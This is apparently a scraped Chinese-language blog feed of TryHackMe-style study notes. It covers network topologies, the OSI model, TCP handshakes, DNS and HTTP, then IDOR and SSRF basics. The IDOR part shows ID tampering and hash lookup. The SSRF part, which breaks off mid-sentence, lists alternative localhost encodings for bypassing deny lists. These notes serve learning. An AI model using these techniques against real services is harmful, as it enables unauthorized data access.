这种类型的连接依赖于称为主干电缆的单个连接。这种类型的拓扑类似于树的叶子，因为设备（叶子）从此电缆上的树枝所在的位置开始。\n由于发往每个设备的所有数据都沿着同一根电缆传输，因此如果拓扑中的设备同时请求数据，则很快就会变得缓慢和瓶颈。这种瓶颈还会导致非常困难的故障排除，因为很快就会变得难以识别哪个设备遇到了问题，所有数据都沿着同一路径传输。\n然而，话虽如此，总线拓扑是更容易设置且更具成本效益的拓扑之一，因为它们需要花费，例如用于连接这些设备的布线或专用网络设备。\n最后，总线拓扑的另一个缺点是，在发生故障时几乎没有冗余。这个缺点是因为沿主干电缆存在单点故障。如果此电缆断开，设备将无法再沿总线接收或传输数据。\n环形拓扑 环形拓扑（也称为令牌拓扑）具有一些相似之处。计算机等设备直接相互连接以形成一个环路，这意味着几乎不需要布线，并且对专用硬件（例如在星形拓扑中）的依赖较小。\n环形拓扑的工作原理是跨循环发送数据，直到数据到达目标设备，并使用循环中的其他设备转发数据。有趣的是，如果设备没有要发送的数据，则它只会从此拓扑中的另一台设备发送接收到的数据。如果设备恰好有数据要发送，它将先发送自己的数据，然后再从另一台设备发送数据。\n由于数据只有一个方向可以穿过此拓扑，因此对出现的任何故障进行故障排除相当容易。然而，这是一把双刃剑，因为它不是一种有效的数据通过网络传输的方式，因为它可能必须先访问许多多个设备才能到达预期的设备。\n最后，环形拓扑不太容易出现瓶颈，例如在总线拓扑中，因为大量流量不会在任何时候通过网络传输。但是，这种拓扑的设计确实意味着诸如电缆切断或设备损坏等故障将导致整个网络中断。\n什么是交换机？ 交换机是网络中的专用设备，旨在聚合多个其他设备，例如计算机、打印机或任何其他使用以太网的支持联网的设备。这些不同的设备插入交换机的端口。交换机通常位于较大的网络中，例如企业、学校或类似规模的网络，其中有许多设备可以连接到网络。交换机可以通过 4、8、16、24、32 和 64 端口来连接大量设备，以便设备插入。\n交换机比较小的同类产品（集线器/中继器）效率更高。交换机跟踪连接到哪个端口的设备。这样，当它们收到数据包时，它不会像集线器那样将该数据包重复到每个端口，而是将其发送到预期目标，从而减少网络流量。\n交换机和路由器都可以相互连接。这样做的能力通过为数据添加多个路径来增加网络的冗余（可靠性）。如果一条路径出现故障，则可以使用另一条路径。虽然这可能会降低网络的整体性能，因为数据包必须花费更长的时间来传输，但没有停机时间 - 考虑到替代方案，这是一个很小的代价。\n什么是路由器？ 路由器的工作是连接网络并在它们之间传递数据。它通过使用路由来实现这一点（因此得名 router）\n路由是给跨网络传输数据的过程的标签。路由涉及在网络之间创建路径，以便成功传送此数据。\n当设备通过许多路径连接时，路由非常有用，如下面的示例图所示。\n子网划分入门 正如我们之前在整个模块中讨论的那样，网络可以找到各种形状和大小 - 从小到大。子网划分是指将网络在其内部拆分为更小的微型网络。把它想象成为你的朋友切蛋糕。只有一定数量的蛋糕可以吃，但每个人都想分一杯羹。子网划分就是你决定谁得到什么份额，并保留这个比喻蛋糕的这样一块。\n以一家企业为例;您将拥有不同的部门，例如：\n会计学 金融 人力资源 虽然您知道在现实生活中将信息发送到正确的部门的位置，但网络也需要知道。网络管理员使用子网划分对网络的特定部分进行分类和分配，以反映这一点。\n子网划分是通过拆分网络可容纳的主机数量来实现的，该主机数由称为子网掩码的数字表示。\n正如我们所记得的，IP 地址由四个称为八位字节的部分组成。子网掩码也是如此，它也表示为 4 个字节 （32 位） 的数字，范围从 0 到 255 （0-255）。\n子网以三种不同的方式使用 IP 地址：\n确定网络地址 确定主机地址 确定默认网关 让我们将这三个部分分为下表以了解它们的用途：\n类型 目的 解释 例 网络地址 此地址标识实际网络的起点，并用于标识网络的存在。 例如，IP 地址为 192.168.1.100 的设备将位于由 192.168.1.0 标识的网络上 192.168.1.0 主机地址 此处的 IP 地址用于标识子网上的设备 例如，设备的网络地址为 192.168.1.1 192.168.1.100 默认网关 默认网关地址是分配给网络上设备的特殊地址，该地址能够将信息发送到另一个网络 任何需要发送到不在同一网络上的设备（即不在 192.168.1.0 上）的数据都将被发送到此设备。这些设备可以使用任何主机地址，但通常使用网络中的第一个或最后一个主机地址（.1 或 .254） 192.168.1.254 现在，在小型网络中，例如在家中，您将位于一个子网上，因为您一次需要连接超过 254 台设备的可能性不大。\n但是，企业和办公室等场所将拥有更多的此类设备（PC、打印机、相机和传感器），这些设备将进行子网划分。\n子网划分提供了一系列好处，包括：\n效率 安全 完全控制 稍后我们将继续探讨子网划分如何提供这些好处;但是，就目前而言，我们需要了解的只是它的安全元素。让我们以街上的典型咖啡馆为例。这家咖啡馆将有两个网络：\n一个用于员工、收银机和设施的其他设备 一个供公众用作热点 子网划分允许您将这两个用例彼此分开，同时获得连接到更大网络（如 Internet）的好处。\nARP 回顾我们之前的任务，设备可以有两个标识符：MAC 地址和 IP 地址，简称 A ddress Resolution Protocol 或简称 ARP，是负责允许设备在网络上识别自己的技术。\n简单地说，ARP 允许设备将其 MAC 地址与网络上的 IP 地址相关联。网络上的每台设备都将保留与其他设备关联的 MAC 地址的日志。\n当设备希望与其他设备通信时，它们将向整个网络发送广播，以搜索特定设备。设备可以使用 ARP 查找设备的 MAC 地址（以及物理标识符）以进行通信。\nARP 是如何工作的？\n网络中的每个设备都有一个用于存储信息的分类账，称为缓存。在 ARP 上下文中，此缓存存储网络上其他设备的标识符。\n为了将这两个标识符（IP 地址和 MAC 地址）映射在一起，ARP 发送两种类型的消息：\nARP （ARP）请求 ARP （ARP）答 发送 ARP 请求时，会在网络上向其他设备广播一条消息，询问“拥有此 IP 地址的 mac 地址是什么？当其他设备收到该消息时，它们只有在拥有该 IP 地址时才会响应，并将发送包含其 MAC 地址的 ARP 回复 。请求设备现在可以记住此映射并将其存储在其 ARP 缓存中以备将来使用。\n下图说明了此过程：\nOSI模型 什么是OSI OSI 模型（或 Open Systems Interconnection 模型）是网络中使用的基本模型。 这个关键模型提供了一个框架，规定了所有联网设备将如何发送、接收和解释数据。\nOSI 模型的主要优点之一是，设备在与其他设备通信时可以在网络上具有不同的功能和设计。通过遵循 OSI 模型一致性的网络发送的数据可以被其他设备理解。\nOSI 模型由七层组成，如下图所示。每个层都有一组不同的职责，从第 7 层到第 1 层排列。\n在数据经过的每一层，都会发生特定的流程，并将信息添加到这些数据中，这就是我们将在本次会议中即将讨论的任务中讨论的内容。但是，现在，我们只需要了解此过程称为封装以及下图中 OSI 模型的外观：\n第一层 物理层 此层是最容易掌握的层之一。简单地说，此层引用网络中使用的硬件的物理组件，是您将找到的最低层。设备使用电信号在二进制编号系统（1 和 0）中相互传输数据。\n例如，连接设备的以太网电缆，如下图所示：\n第二层 数据链路层 数据链路层侧重于传输的物理寻址。它从网络层接收数据包（包括远程计算机的 IP 地址），并添加接收端点的物理 MAC（媒体访问控制）地址。每台支持网络的计算机内部都有一个 Network Interface Card （NIC）， 它带有一个唯一的 MAC 地址来识别它。\nMAC 地址由制造商设置并实际烧录到卡中;它们无法更改 - 尽管它们可以被欺骗。当信息通过网络发送时，它实际上是用于标识信息的确切发送位置的物理地址。\n此外，数据链路层的工作还包括以适合传输的格式呈现数据。\n第三层 网络层 OSI 模型的第三层（网络层）是路由和重新组装数据的魔力发生的地方（从这些小块到更大的块）。首先，路由只是确定这些数据块应发送到的最佳路径。\n虽然这一层的一些协议准确地确定了数据到达设备的 “最佳” 路径，但我们只能在网络模块的这个阶段知道它们的存在。简而言之，这些协议包括 OSPF （Open S hortest Path First） 和 RIP （Routing Information Protocol）。决定采用哪种路线的因素由以下因素决定：\n哪条路最短？即，数据包需要传输的设备数量最少。 什么路径最可靠？即，数据包之前是否在该路径上丢失过？ 哪条路径的物理连接速度更快？即，一条路径是使用铜缆连接（较慢）还是光纤（相当快）？ 在这一层，一切都通过 IP 地址处理，例如 192.168.1.100。能够使用 IP 地址传输数据包的设备（例如路由器）称为第 3 层设备，因为它们能够在 OSI 模型的第三层工作。\n第四层 传输层 OSI 模型的第 4 层在通过网络传输数据方面起着至关重要的作用，可能有点难以掌握。在设备之间发送数据时，它遵循两种不同的协议之一，这些协议是根据几个因素决定的：\nTCP 协议 UDP 协议 让我们从 TCP 开始。Transmission Control Protocol （TCP）。 顾名思义，该协议在设计时考虑了可靠性和保证。此协议在两个设备之间保留一个持续连接，用于发送和接收数据所需的时间。\n不仅如此，TCP 还将错误检查纳入其设计中。错误检查是 TCP 如何保证从会话层（第 5 层）中的小块发送的数据随后以相同的顺序接收和重组。\n让我们在下表中总结 TCP 的优缺点：\n**TCP 的优点 ** **TCP 的缺点 ** 保证数据的准确性。 需要在两个设备之间建立可靠的连接。如果未收到一小块数据，则无法使用整个数据块。 能够同步两个设备，以防止彼此被数据淹没。 慢速连接可能会给另一台设备带来瓶颈，因为连接将始终在接收计算机上保留。 执行更多的过程以实现可靠性。 TCP 比 UDP 慢得多，因为使用此协议的设备必须完成更多工作。 TCP 用于文件共享、Internet 浏览或发送电子邮件等情况。这种用法是因为这些服务要求数据准确和完整（拥有半个文件不好！\n在下图中，我们可以看到猫的图片是如何从 “webserver” 分解成小块数据（称为数据包）的，其中 “computer” 将猫的图片重新构建为正确的顺序。\n现在让我们进入 User Datagram Protocol（或简称 UDP）。该协议不如它的兄弟 TCP 协议先进。它没有 TCP 提供的许多功能，例如错误检查和可靠性。事实上，通过 UDP 发送的任何数据都会发送到计算机，无论它是否到达那里。两个设备之间没有同步或保证;只是希望最好，手指交叉。\n虽然这听起来很不利，但它确实有其优点，我们将在下表中进行布局：\nUDP 的优势 UDP 的缺点 UDP 比 TCP 快得多。 UDP 不关心是否收到数据。 UDP 让应用程序层（用户软件）决定是否可以控制数据包的发送速度。 从这个意义上说，它对软件开发人员来说是相当灵活的。 UDP 不会像 TCP 那样在设备上保留连续连接。 这意味着不稳定的连接会给用户带来糟糕的体验。 使用与之前相同的示例，我们现在可以看到“计算机”只接收了数据包 #1 和 #3，这意味着缺少一半的图像。\nUDP 在发送小块数据的情况下非常有用。\nTCP三次握手四次挥手 三次握手与四次挥手是TCP协议中用于建立和终止连接的关键机制，确保数据传输的可靠性。以下是详细解释：\n一、三次握手（建立连接） 目的：确保客户端与服务器双方具备收发数据的能力。 过程：\nSYN（客户端 → 服务器） 客户端发送SYN报文（SYN=1，seq=x），进入SYN_SENT状态。 作用：请求建立连接，并初始化序列号。 SYN-ACK（服务器 → 客户端） 服务器回应SYN-ACK报文（SYN=1，ACK=1，ack=x+1，seq=y），进入SYN_RCVD状态。 作用：确认收到请求，同时发送自身序列号。 ACK（客户端 → 服务器） 客户端发送ACK报文（ACK=1，ack=y+1，seq=x+1），双方进入ESTABLISHED状态。 作用：确认服务器的响应，完成连接建立。 为什么需要三次？\n防止已失效的请求报文突然传到服务器（如网络延迟导致重复SYN），避免资源浪费。 二、四次挥手（终止连接） 目的：确保双方数据收发完毕后再安全关闭连接。 过程：\nFIN（主动关闭方 → 被动关闭方） 主动方（如客户端）发送FIN报文（FIN=1，seq=u），进入FIN_WAIT_1状态。 作用：表示不再发送数据，但可接收数据。 ACK（被动关闭方 → 主动关闭方） 被动方回应ACK报文（ACK=1，ack=u+1，seq=v），进入CLOSE_WAIT状态。 作用：确认收到关闭请求，但可能继续发送未完成的数据。 FIN（被动关闭方 → 主动关闭方） 被动方发送FIN报文（FIN=1，ACK=1，ack=u+1，seq=w），进入LAST_ACK状态。 作用：表示自身数据已发送完毕，请求关闭连接。 ACK（主动关闭方 → 被动关闭方） 主动方回应ACK报文（ACK=1，ack=w+1，seq=u+1），进入TIME_WAIT状态（等待2MSL时间）。 作用：确认最终关闭，防止最后一个ACK丢失导致被动方重传FIN。 为什么需要四次？\nTCP是全双工通信，双方需独立关闭发送通道。 三、三次握手：建立连接（确保双方能正常通话） 场景：小明想约小美商量聚会计划。 第一次握手（SYN） 小明打电话给小美：“小美，你能听到我说话吗？”（发送 SYN 包） 状态：小明等待回应（SYN_SENT）。 第二次握手（SYN-ACK） 小美接听电话：“小明，我能听到！你能听到我吗？”（回复 SYN-ACK 包） 状态：小美等待小明确认（SYN_RCVD）。 第三次握手（ACK） 小明回应：“我能听到！”（发送 ACK 包） 状态：双方正式通话（ESTABLISHED），开始讨论聚会细节（数据传输）。 为什么需要三次？ 如果小明喊完第一句后，小美没回应，小明会重拨（避免网络延迟导致重复连接）。三次确认确保双方 ​​“听得到”且“能回应”​。\n四、四次挥手：断开连接（确保双方说完所有话） 场景：讨论结束，两人要挂电话。 第一次挥手（FIN） 小明说：“我要说的都说完了，挂了吧！”（发送 FIN 包） 状态：小明等待小美确认（FIN_WAIT_1）。 第二次挥手（ACK） 小美回应：“好的，我知道你说完了。”（回复 ACK 包） 状态：小美可能还有话要说（CLOSE_WAIT），小明等待小美结束（FIN_WAIT_2）。 第三次挥手（FIN） 小美补充：“我也说完了，挂了吧！”（发送 FIN 包） 状态：小美等待小明确认（LAST_ACK）。 第四次挥手（ACK） 小明最后回应：“好的，再见！”（发送 ACK 包） 状态：小明等待片刻（TIME_WAIT，防止小美没收到确认），双方挂断（CLOSED）。 为什么需要四次？ 因为两人要 ​各自确认“我说完了”且“你也说完了”​。小明先结束发言权，小美可能还有补充，最后双方才真正挂断。\n五、总结 三次握手：像打电话时的三次确认（“听得到吗？”→“听得到！你呢？”→“我也听得到！”）。 四次挥手：像挂电话时的四次告别（“我说完了”→“好”→“我也说完了”→“好，再见！”）。 技术映射：\nSYN：发起通话请求（“你能听到吗？”）。 ACK：确认收到消息（“好的”）。 FIN：结束发言（“我挂了啊”）。 第五层 会话层 一旦数据从表示层（第 6 层）正确转换或格式化，会话层（第 5 层）将开始创建和维护与数据目标的其他计算机的连接。建立连接后，将创建一个会话。当此连接处于活动状态时，会话也处于活动状态。\n会话层还负责关闭连接（如果连接有一段时间未使用或丢失）。此外，会话可以包含“检查点”，如果数据丢失，则只需要发送最新的数据，从而节省带宽。\n值得注意的是，会话是唯一的，这意味着数据不能在不同的会话之间传输，而实际上只能在每个会话之间传输。\n第六层 表示层 OSI 模型的第 6 层是开始进行标准化的层。由于软件开发人员可以以不同的方式开发任何软件，例如电子邮件客户端，因此无论软件如何工作，数据仍然需要以相同的方式处理。\n该层充当数据进出应用程序层（第 7 层）的转换器。接收计算机还将理解以一种格式发送到计算机的数据，这些数据以另一种格式发送给计算机。例如，当您发送电子邮件时，其他用户可能有其他电子邮件客户端发送给您，但电子邮件的内容仍需要显示相同的内容。\n数据加密（如访问安全站点时的 HTTPS）等安全功能位于此层。\n第七层 应用层 SI 模型的应用层是您最熟悉的层。之所以如此熟悉，是因为应用程序层是协议和规则所在的层，用于确定用户应如何与发送或接收的数据进行交互。\n日常应用程序（如电子邮件客户端、浏览器或文件服务器浏览软件（如 FileZilla）为用户提供了一个友好的 G 实时用户界面 （GUI）， 以便与发送或接收的数据进行交互。其他协议包括 DNS （Domain Name System），这是网站地址转换为 IP 地址的方式。\n","date":"2025-03-20T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/background06.jpg","permalink":"https://Yerucrem.github.io/p/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/","title":"网络基础"},{"content":"DNS详细信息 DNS（域名系统）为我们提供了一种与 Internet 上的设备进行通信的简单方法，而无需记住复数。就像每栋房子都有一个直接向其发送邮件的唯一地址一样，互联网上的每台计算机都有自己唯一的地址来与之通信，称为 IP 地址。IP 地址类似于以下 104.26.10.229,4 组数字，范围从 0 到 255，用句点分隔。当您想访问一个网站时，记住这组复杂的数字并不十分方便，而这正是 DNS 可以提供帮助的地方。因此，您可以记住 tryhackme.com，而不是记住 104.26.10.229。\n域层次结构 TLD （顶级域名） TLD 是域名最右侧的部分。因此，例如，tryhackme.com TLD 是 .com。TLD 有两种类型，gTLD（通用顶级域名）和 ccTLD（国家代码顶级域名）。从历史上看，gTLD 旨在告诉用户域名的用途;例如，.com 用于商业目的，.org 用于组织，.edu 用于教育，.gov 用于政府。ccTLD 用于地理目的，例如 .ca 表示位于加拿大的站点，.co.uk 表示位于英国的站点，依此类推。由于这种需求，涌入了从 .online 、 .club 、 .website 、 .biz 等 新 gTLD 。\n二级域 以 tryhackme.com 为例，.com部分是 TLD，tryhackme 是二级域名。注册域名时，二级域名限制为 63 个字符 + TLD，并且只能使用 a-z 0-9 和连字符（不能以连字符开头或结尾或有连续的连字符）。\n子域 子域位于二级域的左侧，使用句点分隔它;例如，在 name admin.tryhackme.com 中，admin 部分是 subdomain。子域名的创建限制与二级域名相同，限制为 63 个字符，并且只能使用 a-z 0-9 和连字符（不能以连字符开头或结尾，也不能有连续的连字符）。您可以使用多个子域（用句点拆分）来创建更长的名称，例如 jupiter.servers.tryhackme.com。但长度必须保持在 253 个字符或更少。您可以为域名创建的子域数量没有限制。\n","date":"2025-03-19T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/background07.jpg","permalink":"https://Yerucrem.github.io/p/dns-%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF/","title":"DNS 详细信息"},{"content":"HTTP协议 什么是 HTTP？（超文本传输协议） HTTP 是您查看网站时使用的工具，由 Tim Berners-Lee 和他的团队在 1989 年至 1991 年间开发。HTTP 是用于与 Web 服务器通信以传输网页数据（无论是 HTML、图像、视频等）的规则集。\n什么是 HTTPS？ （安全超文本传输协议） HTTPS 是 HTTP 的安全版本。 HTTPS 数据是加密的，因此它不仅可以阻止人们看到您接收和发送的数据，还可以确保您正在与正确的 Web 服务器通信，而不是冒充它。\n什么是 URL？（统一资源定位器） 如果您曾经使用过 Internet，那么您以前也使用过 URL。URL 主要是有关如何访问 Internet 上的资源的指令。下图显示了 URL 及其所有功能的外观（它不会在每个请求中使用所有功能）。\nScheme:这指示使用什么协议来访问资源，例如 HTTP、HTTPS、FTP（文件传输协议）。 **User:**某些服务需要身份验证才能登录，您可以在 URL 中输入用户名和密码才能登录。 **Host:**您要访问的服务器的域名或 IP 地址。 **Port:**您要连接的端口，通常为 80 用于 HTTP，443 用于 HTTPS，但这可以托管在 1 - 65535 之间的任何端口上。 **Path:**您尝试访问的资源的文件名或位置。 **Query String:**可以发送到请求路径的额外信息位。例如，/blog？id=1 将告知博客路径您希望接收 ID 为 1 的博客文章。 Fragment: 这是对请求的实际页面上的位置的引用。这通常用于内容较长的页面，并且可以将页面的某个部分直接链接到该页面，因此用户一旦访问该页面即可查看该页面。 提出请求 只需一行 GET / HTTP/1.1 就可以向 Web 服务器发出请求\n但要获得更丰富的 Web 体验，您还需要发送其他数据。这些其他数据以所谓的 headers 形式发送，其中 header 包含额外的信息，以提供给您正在与之通信的 Web 服务器，但我们将在 Header 任务中对此进行更多介绍。\n请求示例：\n1 2 3 4 5 6 7 8 9 10 GET / HTTP/1.1 Host: tryhackme.com User-Agent: Mozilla/5.0 Firefox/87.0 Referer: https://tryhackme.com/ 第 1 行： 此请求将发送 GET 方法（ 在 HTTP 方法 任务中，有更多相关信息），请求带有 / 的主页，并告知 Web 服务器我们使用的是 HTTP 协议版本 1.1。\n第 2 行： 我们告诉 Web 服务器我们希望网站 tryhackme.com\n第 3 行： 我们告诉 Web 服务器我们使用的是 Firefox 版本 87 浏览器\n第 4 行： 我们告诉 Web 服务器，将我们引荐到此网页的网页是 https://tryhackme.com\n**第 5 行：**HTTP 请求始终以空行结尾，以通知 Web 服务器请求已完成。\n响应示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 HTTP/1.1 200 OK Server: nginx/1.15.8 Date: Fri, 09 Apr 2021 13:34:03 GMT Content-Type: text/html Content-Length: 98 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;TryHackMe\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; Welcome To TryHackMe.com \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 第 1 行： HTTP 1.1 是服务器正在使用的 HTTP 协议版本，然后是 HTTP 状态代码（在本例中为“200 Ok”），这告诉我们请求已成功完成。\n第 2 行： 这告诉我们 Web 服务器软件和版本号。\n第 3 行： Web 服务器的当前日期、时间和时区。\n第 4 行： Content-Type 标头告诉客户端将发送哪种信息，例如 HTML、图像、视频、pdf、XML。\n第 5 行： Content-Length 告诉客户端响应多长时间，这样我们就可以确认没有丢失数据\n**第 6 行：**HTTP 响应包含一个空行，用于确认 HTTP 响应的结束。\n第 7-14 行： 已请求的信息，在本例中为主页。\nHTTP方法 GET Request 这用于从 Web 服务器获取信息。\nPOST Request 这用于将数据提交到 Web 服务器并可能创建新记录\nPUT Request 这用于将数据提交到 Web 服务器以更新信息\nDELETE Request 这用于从 Web 服务器中删除信息/记录。\nHTTP 协议状态代码： 在上一个任务中，您了解到，当 HTTP 服务器响应时，第一行始终包含一个状态代码，告知客户端其请求的结果以及可能如何处理该请求。这些状态代码可以分为 5 个不同的范围：\n100-199 - Information Response 100-199 - 信息响应 发送这些请求是为了告诉客户端其请求的第一部分已被接受，他们应该继续发送请求的其余部分。这些代码不再很常见。 200-299 - 成功 此状态代码范围用于告诉客户端其请求成功。 300-399 - 重定向 这些用于将客户端的请求重定向到另一个资源。这可以是不同的网页，也可以是完全不同的网站。 400-499 - Client Errors 400-499 - 客户端错误 用于通知客户端其请求有错误。 500-599 - 服务器错误 这是为服务器端发生的错误保留的，通常表示处理请求的服务器存在相当大的问题。 常见的 HTTP 状态代码： 有很多不同的 HTTP 状态代码，这还不包括应用程序甚至可以定义自己的 HTTP 状态代码，我们将介绍您可能遇到的最常见的 HTTP 响应：\n200 - OK 200 - 正常 请求已成功完成。 201 - Created 201 - 已创建 已创建资源（例如，新用户或新博客文章）。 301 - Moved Permanently 301 - 永久移动 这会将客户的浏览器重定向到新网页，或告诉搜索引擎该页面已移至其他位置并改为查看那里。 302 - Found 302 - 找到 与上述永久重定向类似，但顾名思义，这只是一个临时更改，在不久的将来可能会再次更改。 400 - Bad Request 400 - 错误请求 这会告诉浏览器他们的请求中有错误或缺失。如果请求的 Web 服务器资源需要客户端未发送的特定参数，则有时可以使用此方法。 401 - Not Authorised 401 - 未授权 在您授权 Web 应用程序（通常是使用用户名和密码）之前，您当前不允许查看此资源。 403 - Forbidden 403 - 禁止 无论您是否登录，您都无权查看此资源。 405 - Method Not Allowed 405 - 不允许使用 资源不允许此方法请求，例如，当资源需要 POST 请求时，您向资源 /create-account 发送 GET 请求。 404 - Page Not Found 404 - 未找到页面 您请求的页面/资源不存在。 500 - Internal Service Error 500 - 内部服务错误 服务器在您的请求中遇到了某种错误，它不知道如何正确处理。 503 - Service Unavailable 503 - 服务不可用 此服务器无法处理您的请求，因为它已过载或停机进行维护。 Headers 头 标头是您在发出请求时可以发送到 Web 服务器的附加数据位。\n尽管在发出 HTTP 请求时不严格要求标头，但您会发现很难正确查看网站。\n通用请求标头 这些是从客户端（通常是您的浏览器）发送到服务器的标头。\nHost: 一些 Web 服务器托管多个网站，因此通过提供主机标头，您可以告诉它您需要哪个网站，否则您只会收到服务器的默认网站。\n**User-Agent:**这是您的浏览器软件和版本号，告诉 Web 服务器您的浏览器软件有助于它为您的浏览器正确格式化网站，并且 HTML、JavaScript 和 CSS 的某些元素仅在某些浏览器中可用。\n**Content-Length:**将数据发送到 Web 服务器（例如在表单中）时，内容长度会告知 Web 服务器 Web 请求中预期有多少数据。这样，服务器可以确保它不会丢失任何数据。\n**Accept-Encoding:**告诉 Web 服务器浏览器支持哪些类型的压缩方法，以便可以缩小数据以通过 Internet 传输。\n**Cookie:**发送到服务器以帮助记住您的信息的数据（有关更多信息，请参阅 Cookie 任务）。\n常见响应标头 这些是在请求后从服务器返回给客户端的标头。\n**Set-Cookie:**要存储的信息将在每个请求中发送回 Web 服务器（请参阅 cookie 任务以了解更多信息）。\n**Cache-Control:**在浏览器再次请求响应之前，将响应内容存储在浏览器的缓存中多长时间。\nContent-Type: 这会告诉客户端返回什么类型的数据，即 HTML、CSS、JavaScript、图像、PDF、视频等。使用 content-type 标头，浏览器就可以知道如何处理数据。\n**Content-Encoding:**通过 Internet 发送数据时，使用了什么方法来压缩数据以使其更小。\nCookies 它们只是存储在您计算机上的一小段数据。当您从 Web 服务器收到 “Set-Cookie” 标头时，将保存 Cookie。然后，您发出的每个进一步请求，您都会将 cookie 数据发送回 Web 服务器。由于 HTTP 是无状态的（不会跟踪您以前的请求），因此 cookie 可用于提醒 Web 服务器您是谁、网站的一些个人设置或您以前是否访问过该网站。让我们看一下这个 HTTP 请求示例：\nCookie 可用于多种用途，但最常用于网站身份验证。cookie 值通常不是您可以看到密码的明文字符串，而是令牌（人类不容易猜到的唯一密码）。\n查看您的 Cookie 您可以在浏览器中使用开发人员工具轻松查看浏览器向网站发送的 Cookie。\n打开开发人员工具后，单击“Network”（网络）选项卡。此选项卡将向您显示浏览器请求的所有资源的列表。您可以单击每个选项以接收请求和响应的详细分类。如果您的浏览器发送了 Cookie，您将在请求的“Cookie”选项卡上看到这些 Cookie。\n","date":"2025-03-19T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/9e73050aede3552bc3b00fe7cfe1120f427c37f01e08ad760bbdfa9abc939b1c.png","permalink":"https://Yerucrem.github.io/p/http-%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF/","title":"HTTP 详细信息"},{"content":"IDOR基础 什么是IDOR IDOR（ Insecure Direct Object Reference） 代表不安全的直接对象引用，是一种访问控制漏洞。\n当 Web 服务器收到用户提供的输入以检索对象（文件、数据、文档），对输入数据给予了太多信任，并且未在服务器端对其进行验证以确认所请求的对象属于请求它的用户时，就会发生这种类型的漏洞。\n示例 假设您刚刚注册了一项在线服务，并且想要更改您的个人资料信息。您单击的链接将转到 http://online-service.thm/profile?user_id=1305，您可以看到您的信息。\n好奇心让您尝试将 user_id 值更改为 1000 （http://online-service.thm/profile?user_id=1000），令您惊讶的是，您现在可以看到其他用户的信息。您现在发现了一个 IDOR 漏洞！理想情况下，应该在网站上进行检查，以确认用户信息属于请求它的用户。\n在编码中发现IDOR 当通过帖子数据、查询字符串或 cookie 将数据从一个页面传递到另一个页面时，Web 开发人员通常首先会获取原始数据并对其进行编码。编码可确保接收 Web 服务器能够理解内容。编码将二进制数据转换为 ASCII 字符串，通常使用 a-z、A-Z、0-9 和 = 字符 用于填充。Web 上最常见的编码技术是 base64 编码，通常很容易被发现。您可以使用网站 Like https://www.base64decode.org/ 解码字符串，然后编辑数据并使用 https://www.base64encode.org/ 再次重新编码，然后重新提交 Web 请求以查看响应是否有更改。\n请参阅下图作为此过程的图形示例：\n哈希IDOR 散 列 ID 比编码的 ID 要复杂一些，但它们可能遵循可预测的模式，例如是整数值的哈希版本。例如，如果使用 md5 哈希，则 ID 号 123 将变为 202cb962ac59075b964b07152d234b70。\n值得将任何发现的哈希值通过 Web 服务，例如 https://crackstation.net/（它有一个包含数十亿个 hash to value 结果的数据库），看看我们是否能找到任何匹配项。\nUnpredictable IDs 如果使用上述方法无法检测到 ID，则 IDOR 检测的一个很好的方法是创建两个帐户并在它们之间交换 ID 号。如果您可以使用其他用户的 ID 号查看其他用户的内容，同时仍然使用其他账户登录（或根本未登录），则您发现了有效的 IDOR 漏洞。\nIDOR在哪里 您所针对的易受攻击的终端节点可能并不总是您在地址栏中看到的。它可能是您的浏览器通过 AJAX 请求加载的内容，或者您在 JavaScript 文件中找到引用的内容。\n有时，终端节点可能有一个未引用的参数，该参数可能在开发过程中有所用处，并被推送到生产环境中。例如，您可能会注意到对 /user/details 的调用显示您的用户信息（通过您的会话进行身份验证）。但是通过一种称为参数挖掘的攻击，您发现了一个名为 user_id 的参数，您可以使用它来显示其他用户的信息，例如 /user/details？user_id=123\n","date":"2025-03-19T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/54afbc538832e9159efdc2ac951b4fabecad8304bd717a9aece08e26440c0690.png","permalink":"https://Yerucrem.github.io/p/idor%E5%9F%BA%E7%A1%80/","title":"IDOR基础"},{"content":"SSRF基础 什么是SSRF SSRF 代表服务器端请求伪造。这是一个漏洞，允许恶意用户使 Web 服务器向攻击者选择的资源发出额外或经过编辑的 HTTP 请求。\nSSRF 的类型 SSRF 漏洞有两种类型;第一个是常规 SSRF，其中数据返回到攻击者的屏幕。第二个是盲目 SSRF 漏洞，其中发生了 SSRF，但没有信息返回到攻击者的屏幕。\n影响是什么？ 成功的 SSRF 攻击可能导致以下任何情况：\n进入未经授权的区域。 访问客户/组织数据。 能够扩展到内部网络。 显示身份验证令牌/凭据。 查找SSRF漏洞 可以通过多种不同的方式在 Web 应用程序中发现潜在的 SSRF 漏洞。以下是四个常见位置的示例：\n当地址栏的参数中使用完整 URL 时：\n表单中的隐藏字段：\n部分 URL，例如主机名：\n或者可能只是 URL 的路径：\n其中一些示例比其他示例更容易被利用，因此需要进行大量试验和错误才能找到有效的有效负载。\n如果使用盲 SSRF，并且没有输出反射给您，则需要使用外部 HTTP 日志记录工具来监控请求，例如 requestbin.com、您自己的 HTTP 服务器或 Burp Suite 的协作者客户端。\n常见的防御手段与应对 更了解安全漏洞的开发人员意识到 SSRF 漏洞的风险，可以在其应用程序中实施检查，以确保请求的资源符合特定规则。通常有两种方法，拒绝列表或允许列表。\n拒绝列表 在拒绝列表 （Deny List） 中，接受除列表中指定的资源或与特定模式匹配的资源之外的所有请求。Web 应用程序可以使用拒绝列表来保护敏感端点、IP 地址或域不被公众访问，同时仍允许访问其他位置。限制访问的特定端点是 localhost，它可能包含服务器性能数据或其他敏感信息，因此 localhost 和 127.0.0.1 等域名会出现在拒绝列表中。攻击者可以使用替代本地主机引用绕过拒绝列表，例如 0、0.0.0.0、0000、127.1、127...*、2130706433、017700000001 或具有解析为 IP 地址 127.0.0.1 的 DNS 记录的子域，例如 